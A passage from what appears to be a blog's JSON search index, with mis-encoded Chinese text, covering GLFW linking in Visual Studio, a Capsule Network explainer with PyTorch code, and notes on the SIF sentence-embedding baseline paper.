demoç¨‹åºæ—¶è¸©å¾—ä¸€ç‚¹å‘ï¼Œæ¯•ç«Ÿåˆšå¼€å§‹æ¥è§¦C++ã€‚","text":"Static link æ›´å¿«é€Ÿï¼Œç¼–è¯‘æ—¶ä¼šä¼˜åŒ–ã€‚åœ¨visual studioä¸­éœ€è¦æ·»åŠ header fileå’Œlib fileè·¯å¾„ã€‚ä»¥GLFWåº“çš„ä½¿ç”¨ä¸ºä¾‹ åœ¨projectæ–‡ä»¶å¤¹ä¸‹æ–°å»ºDependenciesæ–‡ä»¶å¤¹ï¼Œå°†ä¸‹è½½çš„ include å’Œ lib-vc2017 å¤åˆ¶åˆ°æ–‡ä»¶å¤¹ä¸‹ã€‚ æ·»åŠ  include ä¸‹çš„header file æ·»åŠ lib file æ·»åŠ ç›®æ ‡static lib fileåˆ°projectã€‚æ–‡ä»¶ä½äºlib-vc2017æ–‡ä»¶å¤¹ä¸‹ã€‚ Dynamic link lib-vc2017æ–‡ä»¶å¤¹ä¸‹ï¼Œè¿˜æœ‰glfw3dll.libï¼Œè¿™æ˜¯åŠ¨æ€é“¾æ¥éœ€è¦å¯¼å…¥çš„lib fileã€‚å³æ›¿æ¢ä¸Šå›¾ä¸­çš„glfw3.libä¸ºglfw3dll.libã€‚ ä½†æ˜¯éœ€è¦æ³¨æ„ï¼Œdllæ–‡ä»¶éœ€è¦ä¸å¯æ‰§è¡Œæ–‡ä»¶ xxx.exe ä½äºåŒä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹ï¼Œåœ¨ç¨‹åºè¿è¡Œæ—¶åŠ¨æ€é“¾æ¥ã€‚å¦åˆ™ä¼šæŠ¥é”™ã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"CS","slug":"Notes/CS","permalink":"https://racleray.github.io/categories/Notes/CS/"}],"tags":[{"name":"c++","slug":"c","permalink":"https://racleray.github.io/tags/c/"},{"name":"library","slug":"library","permalink":"https://racleray.github.io/tags/library/"}]},{"title":"Capsule Net","slug":"CapsuleNet","date":"2020-07-07T11:55:17.000Z","updated":"2023-08-07T11:54:31.028Z","comments":true,"path":"posts/cd141949.html","link":"","permalink":"https://racleray.github.io/posts/cd141949.html","excerpt":"è®°å½• Capsule Net ç›¸å…³æ¦‚ç‡æ€æƒ³ï¼Œè™½ç„¶å¾ˆå°‘ç”¨åˆ°ï¼Œä½†æ˜¯å®ƒçš„ç½‘ç»œè®¾è®¡æŒºæœ‰æ„æ€çš„ã€‚","text":"ä¸€ä¸ª capsule æ˜¯ä¸€ç»„ç¥ç»å…ƒï¼Œcapsule activity vector è¡¨ç¤ºç‰¹å®šç±»å‹çš„å®ä½“ï¼ˆä¾‹å¦‚å¯¹è±¡æˆ–å¯¹è±¡éƒ¨åˆ†ï¼‰çš„å®ä¾‹åŒ–å‚æ•°ã€‚activity vectorçš„é•¿åº¦æ¥è¡¨ç¤ºå®ä½“å­˜åœ¨çš„æ¦‚ç‡ï¼Œæ–¹å‘è¡¨ç¤ºå®ä¾‹åŒ–å‚æ•°ã€‚å‰ä¸€å±‚capsuleé€šè¿‡è½¬æ¢çŸ©é˜µå¯¹ä¸‹ä¸€å±‚capsuleçš„å®ä¾‹åŒ–å‚æ•°è¿›è¡Œé¢„æµ‹ã€‚è¯¥ç½‘ç»œç›¸æ¯”äºCNNï¼Œå¯¹äºé‡å çš„ç›®æ ‡ï¼Œè¯†åˆ«æ•ˆæœæ›´å¥½ä¸”èƒ½åˆ†ç¦»å‡ºé‡å ç›®æ ‡ã€‚ç®—æ³•ä½¿ç”¨ iterative routing-by-agreement mechanismï¼Œé«˜å±‚çº§çš„capsuleçš„activity vectorçš„è®¡ç®—è¿‡ç¨‹å°†æ¥æ”¶ä½å±‚capsuleçš„è®¡ç®—ç»“æœã€‚ ç›¸æ¯”äºCNNï¼ŒCaps Netç”¨vector-output capsulesä»£æ›¿CNNçš„scalar-output feature detectorsï¼Œå¹¶ä½¿ç”¨routing-by-agreementä»£æ›¿max-pooling Motivation â€‹ äººçš„è§†è§‰ç³»ç»Ÿé€šå¸¸ä¹‹å…³æ³¨å›¾åƒä¸­å¾ˆå°éƒ¨åˆ†çš„é‡è¦ä¿¡æ¯ï¼Œè¿™éƒ¨åˆ†ä¿¡æ¯è§†è§‰ç³»ç»Ÿé€šè¿‡é«˜åˆ†è¾¨ç‡å¤„ç†ï¼Œè€Œå…¶ä»–ä¸é‡è¦çš„ä¿¡æ¯å¸¸å¸¸å°±å¿½ç•¥æ‰ã€‚ â€‹ å¤„ç†è¿™éƒ¨åˆ†é‡è¦ä¿¡æ¯çš„æ¨¡å‹ï¼Œæ–‡ç« å«åšsingle fixationã€‚å‡è®¾single fixationå¯ä»¥æå–çš„ä¿¡æ¯ä¸ä»…ä»…æ˜¯æŸä¸€ä¸ªäº‹ç‰©çš„ç‰¹å¾ï¼Œè€Œæ˜¯æŸä¸€ä¸ªç±»å‹çš„ç‰¹å¾ä¿¡æ¯ï¼Œå¹¶ä¸”åœ¨å»ºæ¨¡è¿‡ç¨‹ä¸­å¿½ç•¥æ¯ä¸€ä¸ªfixationä¹‹é—´ç›¸äº’å·¦å³çš„è§„å¾‹ã€‚åªè¦æ±‚æ¨¡å‹è§£æå‡ºæ¯ä¸€ä¸ªsingle fixationã€‚ â€‹ ä¸€ä¸ªcapsuleä»£è¡¨å›¾åƒä¸­ä¸€ä¸ªéƒ¨åˆ†çš„ç›®æ ‡ä¿¡æ¯ï¼Œå¹¶ä¸”æ–‡ç« ä¸­æåˆ°â€œæ„ŸçŸ¥æ‹¥æŒ¤â€œçš„ç ”ç©¶ï¼Œæ¥æ”¯æ’‘ ä¸€ä¸ªcapsuleåªä»£è¡¨ä¸€ä¸ªç›®æ ‡ä¿¡æ¯çš„åˆç†æ€§ã€‚ image â€‹ capsuleå¯ä»¥ä»£è¡¨ç›®æ ‡çš„å¾ˆå¤šä¿¡æ¯ï¼Œæ–‡ç« å°†capsuleè¾“å‡ºvectorçš„é•¿åº¦çº¦æŸåœ¨1ä»¥å†…ï¼Œä»£è¡¨å­˜åœ¨æ¦‚ç‡ï¼›vectorçš„æ–¹å‘ä»£è¡¨ç›®æ ‡çš„ç‰¹å¾ã€‚ â€‹ capsuleçš„å­¦ä¹ çš„ä¿¡æ¯å…·æœ‰ä¸€ç§å…¨å±€çš„ç›¸å…³æ€§ã€‚è¿™æ ·å¯ä»¥è§£å†³ä»¥ä¸‹çš„é—®é¢˜ã€‚CNNå€¾å‘äºå±€éƒ¨ç‰¹å¾çš„æ£€æµ‹ï¼Œæ•´ä½“ä¸Šçš„ç©ºé—´å…³ç³»å¯¹å…¶é¢„æµ‹ç»“æœçš„å½±å“è¾ƒå°ã€‚å®é™…ä¸Šä¸æ˜¯äººè„¸çš„ç…§ç‰‡ï¼Œåœ¨æ­¤å¤„éƒ½æ£€æµ‹ä¸ºæ­£ç¡®ã€‚ Vector inputs and outputs of a capsule â€‹ æ ¹æ®é•¿åº¦ä»£è¡¨å‡ºç°æ¦‚ç‡çš„æ€è·¯ï¼Œæ–‡ç« æå‡ºäº†ä»¥ä¸‹â€œæ¿€æ´»å‡½æ•°â€ï¼š image â€‹ è¾“å‡ºå°†ç¡®ä¿short vectorsé•¿åº¦è¶‹äº0ï¼Œlong vectorsé•¿åº¦è¶‹äº1ã€‚è§’åº¦ä»£è¡¨çš„ä¿¡æ¯ç”±çŸ©é˜µå˜æ¢å’Œä½å±‚ä¸åŒç‰¹å¾çš„å‘é‡åŠ æƒæ±‚å’Œå¾—åˆ°ã€‚ â€‹ uæ¥è‡ªä½å±‚çº§çš„capsuleçš„è¾“å‡ºã€‚\\(c_{ij}\\)ç”±iterative dynamic routing processè®¡ç®—ã€‚\\(b_{ij}\\)é¦–å…ˆä½œä¸ºlogå…ˆéªŒæ¦‚ç‡åˆå§‹åŒ–ï¼Œåœ¨æ¯ä¸€æ­¥è¿­ä»£ä¸­æ›´æ–°æ¦‚ç‡ã€‚ â€‹ \\(c_{ij}\\)ç›¸å½“äºCNNä¸­max poolingå¹²çš„äº‹ã€‚æ„Ÿè§‰æœ‰ç‚¹åƒattentionï¼Œiterative attentionã€‚ image image â€‹ è¿™ç§â€œrouting-by-agreementâ€åº”è¯¥æ¯”é€šè¿‡max-poolingå®ç°çš„éå¸¸åŸå§‹çš„è·¯ç”±å½¢å¼æ›´åŠ æœ‰æ•ˆã€‚åè€…å¯ä»¥ä½¿ä¸€å±‚ä¸­çš„ç¥ç»å…ƒå¿½ç•¥è¯¥å±‚ä¸­é™¤äº†æœ€æ´»è·ƒçš„ç‰¹å¾ä¹‹å¤–çš„æ‰€æœ‰ç‰¹å¾ã€‚å‰è€…å±‚å±‚è¿­ä»£ï¼Œå±‚å±‚parsingï¼Œä¿¡æ¯æŸå¤±è‡ªç„¶æ›´å°‘ã€‚ â€‹ ä¹‹åï¼ŒHintonåˆæå‡ºäº†EM routing[Matrix capsules with EM routing. ICLR (2018)]ã€‚ é€šè¿‡è®¡ç®—Existence probabilityå’Œæ¦‚ç‡åˆ†å¸ƒå®Œæˆä¸åŒå±‚é—´çš„è®¡ç®—ï¼Œç®€å•ç¤ºæ„å›¾å¦‚ä¸‹ã€‚code reference image max-pooling problem â€‹ max-poolingè¿˜å­˜åœ¨ä»¥ä¸‹é—®é¢˜ï¼š ç”šè‡³ä¸èƒ½åŒºåˆ†å·¦å’Œå³ å¯¹rotationä¸æ•æ„Ÿï¼Œä¸èƒ½å­¦ä¹ åˆ°æ–¹å‘ä¿¡æ¯ ä¸€æ¬¡åªèƒ½â€˜çœ‹åˆ°â€™ä¸€ä¸ªobject max-poolingåªåšåˆ°spatial invariance image è€Œä¸èƒ½åšåˆ°spatial equivariance image capsule neté€šè¿‡ï¼š image è®¡ç®—ä¸‹ä¸€å±‚capsuleç»è¿‡Wå˜æ¢åçš„uï¼Œè¿›è¡Œç»„åˆï¼Œå¾—åˆ°ä¸åŒçš„ç»“æœã€‚é”™è¯¯çš„é¢„æµ‹routeè¢«è£å‰ª(pruned)ï¼Œæ¨¡å‹å…·æœ‰ä¸€å®šçš„spatial equivarianceã€‚ image Margin loss for digit existence â€‹ åˆ†åˆ«å¯¹æ¯ä¸ªç±»åˆ«è®¡ç®—æŸå¤±ï¼ŒåŒæ—¶æ³¨æ„åªæœ‰capsuleå¯¹åº”çš„éƒ¨åˆ†å‡ºç°æŸç±»ç›®æ ‡ï¼Œæ‰è®¡ç®—æŸå¤±ã€‚ image â€‹ \\(T_k\\)åªæœ‰åœ¨class kå‡ºç°çš„æ—¶å€™ç­‰äº1ã€‚ image â€‹ \\(\\lambda\\)æ˜¯ä¸ºäº†é˜²æ­¢ï¼Œé™åˆ¶vectoré•¿åº¦ååœ¨è®­ç»ƒå¼€å§‹é˜¶æ®µç”±äºæ²¡æœ‰è¯†åˆ«åˆ°ç›®æ ‡å¯¼è‡´çš„å­¦ä¹ åœæ»é—®é¢˜ï¼Œå–0.5ã€‚æ€»ä½“å­˜åœ¨æ€§æ£€æµ‹lossæ˜¯æ‰€æœ‰ç±»åˆ«capsuleçš„æŸå¤±ä¹‹å’Œã€‚ â€‹ æ•´ä½“æŸå¤±ï¼Œè¿˜è¦åŠ ä¸Šcapsuleé‡æ„å›¾åƒç‰¹å¾çš„æŸå¤±ã€‚ image CapsNet architecture image image â€‹ 32ä¸ªcapsuleï¼Œæ¯ä¸ª8ç»´ã€‚ image â€‹ è½¬æ¢åï¼Œæ¯ä¸ªclass capsule16ç»´ï¼Œä¸åŒè€Œç»´åº¦å½±å“é‡æ„å›¾åƒçš„ä¸åŒç‰¹å¾ã€‚ â€‹ routing-by-agreementçš„è¿­ä»£è¿‡ç¨‹å°±æ˜¯ä¸åŒçš„route squashç»“æœè¿›è¡Œè£å‰ªçš„è¿‡ç¨‹ï¼Œè®¡ç®—ç»“æœç›¸å·®å¤§çš„routeé€æ¸è¢«ç§»é™¤ã€‚ image â€‹ EM routeåˆ™æ˜¯è®¡ç®—primryç»“æœå’Œroute squashç»“æœåˆ†å¸ƒçš„å·®å¼‚ã€‚ image â€‹ capsuleè¾“å‡ºvectorçš„é•¿åº¦çº¦æŸåœ¨1ä»¥å†…ï¼Œä»£è¡¨å­˜åœ¨æ¦‚ç‡ï¼›vectorçš„æ–¹å‘ä»£è¡¨ç›®æ ‡çš„ç‰¹å¾ã€‚ â€‹ å…¶ä¸­æ¯ä¸ªcapsuleçš„è½¬åŒ–çŸ©é˜µéƒ½æ˜¯ç‹¬ç«‹çš„ä¸åŒçš„ï¼Œæ¯ä¸ªclasså¯¹åº”ä¸€ä¸ªcapsuleã€‚ â€‹ A simple CapsNet with 3 layers. PrimaryCapsè®¡ç®—ç¬¬ä¸€å±‚capsulesçš„è¾“å…¥ï¼Œ DigitCapsè®¡ç®—éƒ¨åˆ†ä½¿ç”¨iterative dynamic routingï¼Œè®¡ç®—è¾“å‡ºcapsulesã€‚ â€‹ é‡æ„å›¾åƒç½‘ç»œï¼Œé‡‡ç”¨è®­ç»ƒå¥½çš„DigitCapsï¼Œåœ¨æ­¤åŸºç¡€ä¸Šè®­ç»ƒé‡æ„ç½‘ç»œï¼Œè®¡ç®—å›¾åƒç‰¹å¾é‡æ„æŸå¤±ã€‚åªéœ€è¦å°†true labelçš„capsuleæå–å‡ºæ¥è¿›è¡Œé‡æ„è®¡ç®—å³å¯ã€‚å› æ­¤ï¼Œå¤šä¸ªæ•°å­—é‡åˆçš„é‡æ„ä¹Ÿèƒ½å®ç°ã€‚ Code â€‹ é‡è¦çš„ç½‘ç»œæ„å»ºä»£ç å¦‚ä¸‹ï¼Œå®Œæ•´ä»£ç  â€‹ Caps Netè®­ç»ƒç›¸å¯¹äºCNNæ…¢å¾ˆå¤šï¼Œå¹¶ä¸”åªä½¿ç”¨ä¸€å±‚dynamic routingï¼Œå‚æ•°é‡ä¹Ÿæ›´å¤§ï¼Œbatch sizeç›¸æ¯”CNNä¹Ÿè¦å–å¾—å°ä¸€äº›ï¼Œåœ¨ç›¸åŒæ¡ä»¶ä¸‹ã€‚ â€‹ ç½‘ç»œæ”¶æ•›æ¯”è¾ƒå¿«ï¼Œè€Œä¸”è®¡ç®—è¿‡ç¨‹æŸå¤±çš„å˜åŒ–ç›¸å¯¹ç¨³å®šã€‚ä¸‹å›¾ä¸ºç¬¬ä¸€è½®è®­ç»ƒç»“æœã€‚ â€‹ ç¬¬äºŒè½®è®¡ç®—ç»“æœ â€‹ ç›¸å…³layerå®šä¹‰ï¼Œä»¥ä¸‹ä»£ç å‚è€ƒäº† https://github.com/XifengGuo/CapsNet-Pytorch ï¼Œhttps://github.com/naturomics/CapsNet-Tensorflow.gitã€‚ åœ¨å…¶ä¸Šä¿®æ”¹äº†å†™ç½‘ç»œè®¡ç®—è¿‡ç¨‹ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111import torchimport torch.nn as nnimport torch.nn.functional as Ffrom torch.autograd import Variabledef squash(inputs, axis=-1): \"\"\"capsuleè¾“å‡ºçš„æ¿€æ´»å‡½æ•°\"\"\" norm = torch.norm(inputs, dim=axis, keepdim=True) scale = norm ** 2 / (1 + norm ** 2) / (norm + 1e-8) return scale * inputsclass PrimaryCaps(nn.Module): \"\"\"è®¡ç®—ç¬¬ä¸€å±‚capsulesçš„è¾“å…¥ï¼Œè½¬æ¢æˆ32*6*6ä¸ª8ç»´çš„capsule vector in_channelsï¼šåŸæ–‡ä¸­256 out_channelsï¼šå·ç§¯åçš„é€šé“æ•°ï¼ŒåŸæ–‡ä¸­256 dim_caps: PrimaryCapsè¾“å‡ºçš„æ¯ä¸ªcapsuleçš„ç»´åº¦ kernel_sizeï¼šåŸæ–‡ä¸­9 * 9 strideï¼š2 \"\"\" def __init__(self, in_channels, out_channels, dim_caps, kernel_size, stride=1, padding=0): super(PrimaryCaps, self).__init__() self.dim_caps = dim_caps self.conv2d = nn.Conv2d(in_channels, out_channels, kernel_size=kernel_size, stride=stride, padding=padding) def forward(self, input): \"\"\"è½¬æ¢æˆ32*6*6ä¸ª8ç»´çš„capsule vector, output size=[batch_size, num_caps, dim_caps]\"\"\" output = self.conv2d(input) output = output.view(input.size(0), -1, self.dim_caps) return squash(output)class DenseCaps(nn.Module): \"\"\"iterative dynamic routingè®¡ç®—capsuleç›®æ ‡è¯†åˆ«ç»“æœvectorã€‚ input size = [None, in_num_caps, in_dim_caps]ï¼Œ output size = [None, out_num_caps, out_dim_caps]ã€‚ in_num_caps: ç¬¬ä¸€å±‚çš„è¾“å…¥capsuleæ•°é‡ï¼Œ32*6*6 in_dim_capsï¼šç¬¬ä¸€å±‚çš„è¾“å…¥capsuleç»´åº¦ï¼Œ8 out_num_capsï¼šiterative dynamic routingæ—¶åŠè¾“å‡ºçš„capsuleæ•°é‡ï¼Œ10 out_dim_capsï¼šiterative dynamic routingæ—¶åŠè¾“å‡ºçš„capsuleç»´åº¦ï¼Œ16 iterationsï¼šdynamic routingè½®æ¬¡ weightï¼šç”±32*6*6ä¸ª8ç»´çš„capsule vectorè®¡ç®—10ä¸ª16ç»´çš„capsule vectorçš„transform matrixï¼Œåœ¨æ¯ä¸ª[6 * 6] å•å…ƒå†…çš„capsuleæ˜¯å…±äº«æƒé‡çš„ã€‚ \"\"\" def __init__(self, in_num_caps, in_dim_caps, out_num_caps, out_dim_caps, iterations=3): super(DenseCaps, self).__init__() self.in_num_caps = in_num_caps self.in_dim_caps = in_dim_caps self.out_num_caps = out_num_caps self.out_dim_caps = out_dim_caps self.iterations = iterations self.weight = nn.Parameter(0.01 * torch.randn(1, in_num_caps, out_num_caps * out_dim_caps, in_dim_caps, 1)) def forward(self, u): \"\"\"u_hatåœ¨ä¸åŒlayerçš„capsulesä¹‹é—´ä¼ é€’ï¼Œæ¯å±‚capsulesåªèƒ½æ˜¯æ‰cï¼Œbåœ¨æ›´æ–°ã€‚æ–‡ä¸­ç»“æ„åªæ¥ä¸Šäº†ä¸€å±‚ dynamic routing capsules layerã€‚\"\"\" # self.weight * u # [1 , in_num_caps, out_num_caps * out_dim_caps, in_dim_caps, 1] # [batch, in_num_caps, out_num_caps * out_dim_caps, in_dim_caps, 1] # =&gt;&gt; [batch, in_num_caps, out_num_caps * out_dim_caps, in_dim_caps, 1] # æŒ‰å…ƒç´ ç›¸ä¹˜ï¼Œç„¶ååœ¨reduce sum u_hat = u[:, :, None, :, None] u_hat = self.weight * u_hat.repeat(1, 1, self.out_num_caps * self.out_dim_caps, 1, 1) u_hat = torch.sum(u_hat, dim=3) # [batch, in_num_caps, out_num_caps, out_dim_caps] u_hat = torch.squeeze(u_hat.view(-1, self.in_num_caps, self.out_num_caps, self.out_dim_caps, 1)) u_hat_for_route = u_hat.detach() # coupling coefficient initialize # [batch, in_num_caps, out_num_caps] b = Variable(torch.zeros(u.size(0), self.in_num_caps, self.out_num_caps)).cuda() for i in range(self.iterations): c = F.softmax(b, dim=2) # [batch, in_num_caps, out_num_caps] if i &lt; self.iterations - 1: # u [batch, in_num_caps, out_num_caps, out_dim_caps] # c [batch, in_num_caps, out_num_caps, 1] # =&gt;&gt; [batch, 1, out_num_caps, out_dim_caps] outputs = squash(torch.sum(torch.unsqueeze(c, 3) * u_hat_for_route, dim=1, keepdims=True)) b = b + torch.sum(outputs * u_hat_for_route, dim=-1) else: # æ­¤æ—¶è¿›å…¥bpè®¡ç®— outputs = squash(torch.sum(torch.unsqueeze(c, 3) * u_hat, dim=1, keepdims=True)) # [batch, out_num_caps, out_dim_caps] return torch.squeeze(outputs, dim=1)def caps_loss(y_true, y_pred, x, x_reconstruct, lamada): \"\"\"Capsule loss = Margin loss + lamada * reconstruction loss. y shape [batch, classes], x shape [batch, channels, height, width]\"\"\" L = y_true * torch.clamp(0.9 - y_pred, min=0) ** 2 + \\ 0.5 * (1 - y_true) * torch.clamp(y_pred - 0.1, min=0) ** 2 L_margin = L.sum(dim=1).mean() L_recon = nn.MSELoss()(x_reconstruct, x) return L_margin + lamada * L_recon â€‹ ç½‘ç»œå®šä¹‰ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859import torchimport torch.nn.functional as Ffrom torch.autograd import Variablefrom torch import nnfrom layers import DenseCaps, PrimaryCapsclass CapsuleNet(nn.Module): \"\"\" Input: (batch, channels, width, height) Output:((batch, classes), (batch, channels, width, height)) input_size: [channels, width, height] classes: number of classes iterationsï¼šdynamic routing iterations \"\"\" def __init__(self, input_size, classes, iterations): super(CapsuleNet, self).__init__() self.input_size = input_size self.classes = classes self.iterations = iterations # Layer 1: Just a conventional Conv2D layer self.conv1 = nn.Conv2d(input_size[0], 256, kernel_size=9, stride=1, padding=0) # Layer 2: Conv2D layer with `squash` activation, then reshape to [None, num_caps, dim_caps] self.primarycaps = PrimaryCaps(256, 256, 8, kernel_size=9, stride=2, padding=0) # Layer 3: Capsule layer. iterative dynamic routing. self.digitcaps = DenseCaps(in_num_caps=32*6*6, in_dim_caps=8, out_num_caps=classes, out_dim_caps=16, iterations=iterations) # reconstruction net self.reconstructor = nn.Sequential( nn.Linear(16*classes, 512), nn.ReLU(inplace=True), nn.Linear(512, 1024), nn.ReLU(inplace=True), nn.Linear(1024, input_size[0] * input_size[1] * input_size[2]), nn.Sigmoid() ) self.relu = nn.ReLU() def forward(self, x, y=None): x = self.relu(self.conv1(x)) x = self.primarycaps(x) x = self.digitcaps(x) # [batch, out_num_caps, out_dim_caps] length = x.norm(dim=-1) # vector lenghtä»£è¡¨å­˜åœ¨æ¦‚ç‡ [batch, out_num_caps, 1] if y is None: # during testing, no label given. create one-hot coding using `length` index = length.max(dim=1)[1] # å°†indexå¤„ï¼Œæ›´æ”¹ä¸º1 y = Variable(torch.zeros(length.size()).scatter_(1, index.view(-1, 1).cpu().data, 1.).cuda()) # y[:, :, None]: mask reconstruction = self.reconstructor((x * y[:, :, None]).view(x.size(0), -1)) # å­˜åœ¨æ¦‚ç‡é¢„æµ‹ï¼Œé‡æ„å›¾åƒåƒç´  return length, reconstruction.view(-1, *self.input_size) Other capsules Text â€‹ ä½¿ç”¨capsule netså¤„ç†æ–‡æœ¬çš„ç®€å•æ¶æ„[Investigating capsule networks with dynamic routing for text classification. EMNLP (2018)]ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ image Graph â€‹ ç»“åˆGNNçš„ç®€å•ç½‘ç»œç¤ºæ„[Capsule Graph Neural Network. ICLR (2018)]ã€‚ image 3D point cloud â€‹ 3Dé‡æ„[3D Point-Capsule Networks. CVPR, (2019)] image Applications â€‹ Relation extractionï¼ŒAdversary detectionï¼ŒBrain tumor classificationï¼ŒClassification of Breast Cancer. â€‹ æ¯”å¦‚ï¼ŒRelation extractionæ–¹é¢çš„ç ”ç©¶[Multi-labeled Relation Extraction with Attentive Capsule Network. AAAI (2018)] image â€‹ [Attention-Based Capsule Networks with Dynamic Routing for Relation Extraction. EMNLP 2018] image Problems Optimizing routing å½“å­˜åœ¨è¾ƒå¤šclassæ—¶ï¼Œå‚æ•°é‡å¾ˆå¤§ ä¸èƒ½é©¾é©­å¤§è§„æ¨¡æ•°æ®é›† Resources CVPR2019 Tutorial","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"DL","slug":"Notes/DL","permalink":"https://racleray.github.io/categories/Notes/DL/"}],"tags":[{"name":"capsule","slug":"capsule","permalink":"https://racleray.github.io/tags/capsule/"}]},{"title":"A Sentence Embedding Baseline","slug":"A-SENTENCE-EMBEDDINGS-Baseline","date":"2020-07-07T11:45:39.000Z","updated":"2023-08-07T11:54:31.024Z","comments":true,"path":"posts/8be3b59a.html","link":"","permalink":"https://racleray.github.io/posts/8be3b59a.html","excerpt":"è®°å½•æ™®æ—æ–¯é¡¿å¤§å­¦å¯¹ SENTENCE EMBEDDING è¿›è¡Œä¼˜åŒ–çš„è®ºæ–‡ï¼Œä½¿ç”¨SVDæ¥åŒºåˆ†å‡ºâ€œæ— åŒºåˆ†åº¦çš„å…±æœ‰ä¿¡æ¯â€å’Œâ€œæœ‰åŒºåˆ†åº¦çš„ä¿¡æ¯â€ï¼Œä¸€ç§ä¼˜åŒ– SENTENCE EMBEDDING çš„ç®€å•æ–¹æ³•ã€‚","text":"è®ºæ–‡ã€ŠA SIMPLE BUT TOUGH-TO-BEAT BASELINE FOR SENTENCE EMBEDDINGSã€‹ Info: ç±»åˆ«: [engineering ; pragmatic] ç ”ç©¶ç›®æ ‡ æå‡Towards universal paraphrastic sentence embeddingsï¼ˆJohn Wieting, Mohit Bansal, Kevin Gimpel, and Karen Livescu. ï¼‰è®ºæ–‡æå‡ºçš„ç›‘ç£å­¦ä¹ æ–¹æ³•ï¼Œè½¬è€Œè¿›è¡Œæ— ç›‘ç£å­¦ä¹ ã€‚ æå‡åŸºäºword embeddingçš„å¥å­å‘é‡çš„è¡¨ç°åŠ›ã€‚ ç ”ç©¶æˆæœï¼š completely unsupervised sentence embedding improves performance by about 10% to 30% in textual similarity tasks, and beats sophisticated supervised methods including RNNâ€™s and LSTMâ€™s. new â€œsmoothingâ€ terms that allow for words occurring out of context, as well as high probabilities for words like and, not in all contexts. å­˜åœ¨çš„é—®é¢˜ï¼š åœ¨sentimentç›¸å…³ä»»åŠ¡ä¸Šï¼Œæ•ˆæœä¸€èˆ¬ï¼Œä¸LSTMç›¸å·®è¾ƒå¤§ã€‚ åœ¨ä¸‹æ¸¸ä»»åŠ¡ä¸ºç›‘ç£å­¦ä¹ ä»»åŠ¡æ—¶ï¼Œæ•ˆæœä¸€èˆ¬ï¼Œæ²¡æœ‰LSTMã€Skip-thoughtç­‰æ–¹æ³•æœ‰æ•ˆã€‚ å…³é”®è¯ï¼šsentence embeddingï¼Œæ— ç›‘ç£å­¦ä¹  Brief Summary: è¿™é¡¹å·¥ä½œæä¾›äº†ä¸€ç§ç®€å•çš„å¥å­åµŒå…¥æ–¹æ³•ï¼ŒåŸºäºéšæœºæ¸¸èµ°æ¨¡å‹ç”Ÿæˆå¥å­æ–‡æœ¬(Arora et al.ï¼Œ 2016)ã€‚å®ƒç®€å•ä¸”æ— ç›‘ç£ï¼Œä½†åœ¨å„ç§æ–‡æœ¬ç›¸ä¼¼æ€§ä»»åŠ¡ä¸Šï¼Œå®ƒçš„æ€§èƒ½æ˜æ˜¾ä¼˜äºåŸºçº¿ï¼Œç”šè‡³å¯ä»¥å‡»è´¥ä¸€äº›å¤æ‚çš„ç›‘ç£æ–¹æ³•ï¼Œå¦‚RNNå’ŒLSTMæ¨¡å‹ã€‚è·å¾—çš„embeddingå¯ä»¥ä½œä¸ºä¸‹æ¸¸ç›‘ç£ä»»åŠ¡çš„ç‰¹å¾ï¼Œä¸å¤æ‚æ–¹æ³•ç›¸æ¯”ä¹Ÿèƒ½è·å¾—ä¸é”™çš„ç»“æœã€‚ Main Thought: ç®€å•ä¸”æ— ç›‘ç£çš„Sentence embeddingsè®¡ç®—æ–¹æ³•ã€‚ åœ¨ textual similarity tasksä¸Šï¼Œå½“é€‰å–äº†åˆé€‚å‚æ•°ï¼Œæ•ˆæœç›¸æ¯”äºè¯å‘é‡çš„ç®€å•å¹³å‡ã€LSTMã€Skip-thoughtç­‰æ–¹æ³•æœ‰ä¸€å®šæå‡ã€‚ image ä¸Šå›¾bä¸­ï¼Œåœ¨ä¸åŒçš„é¢†åŸŸéƒ½æ˜¯æœ‰ç”¨çš„ã€‚è¿™å¯¹äºæ— ç›‘ç£æ–¹æ³•å°¤å…¶é‡è¦ï¼Œå› ä¸ºæœªæ ‡è®°çš„å¯ç”¨æ•°æ®å¯ä»¥ä»ç›®æ ‡åº”ç”¨ç¨‹åºçš„ä¸åŒåŸŸä¸­æ”¶é›†ã€‚ åœ¨ä¸‹æ¸¸ä»»åŠ¡ä¸ºç›‘ç£å­¦ä¹ ä»»åŠ¡æ—¶ï¼Œæ•ˆæœä¸‹é™çš„åŸå›  è¿™å¯èƒ½æ˜¯å› ä¸ºsimilarityä»»åŠ¡ç›´æ¥ä¾é ä½™å¼¦ç›¸ä¼¼æ€§, è¿™ä½¿å¾—è¯¥æ–¹æ³•å€¾å‘äºremoving the common components(å¯è§†ä¸ºä¸€ç§å»å™ªdenoising)ã€‚ è€Œåœ¨ç›‘ç£ä»»åŠ¡, ç”±äºæœ‰ä¸€äº›æ ‡ç­¾çš„ä¿¡æ¯ç”¨äºè®­ç»ƒ, åˆ†ç±»å™¨å¯ä»¥æŒ‘å‡ºæœ‰ç”¨å°‘è§çš„componentså’Œå¿½è§†å¸¸è§çš„componentsã€‚ æ— è§†è¯åº ç„¶è€ŒåŸºäºLSTMã€RNNçš„ç»“æœè¡¨æ˜ï¼Œè¯åºåœ¨similarityä»»åŠ¡ä¸Šæ˜¯æœ‰ä½œç”¨çš„ã€‚æœ¬æ–‡æ–¹æ³•å¿½è§†äº†æ¬¡åºï¼Œå¯ä»¥è€ƒè™‘ä¸¤è€…ç»“åˆã€‚ å¿½ç•¥è¯åºçš„æ–¹æ³•ï¼Œæ›´èƒ½æ‰¾åˆ°sentimentå±‚é¢çš„ä¿¡æ¯ã€‚ image ä¸Word2vecçš„è”ç³» Word2vecä½¿ç”¨å­é‡‡æ ·ï¼ˆsub-samplingï¼‰æŠ€æœ¯å¯¹å•è¯wè¿›è¡Œä¸‹é‡‡æ ·ï¼Œæ¦‚ç‡ä¸1 /âˆšpï¼ˆwï¼‰æˆæ­£æ¯”ï¼Œå…¶ä¸­pï¼ˆwï¼‰æ˜¯å•è¯wçš„è¾¹ç¼˜æ¦‚ç‡ã€‚è¿™ç§å¯å‘å¼æ–¹æ³•ä¸ä»…å¯ä»¥åŠ 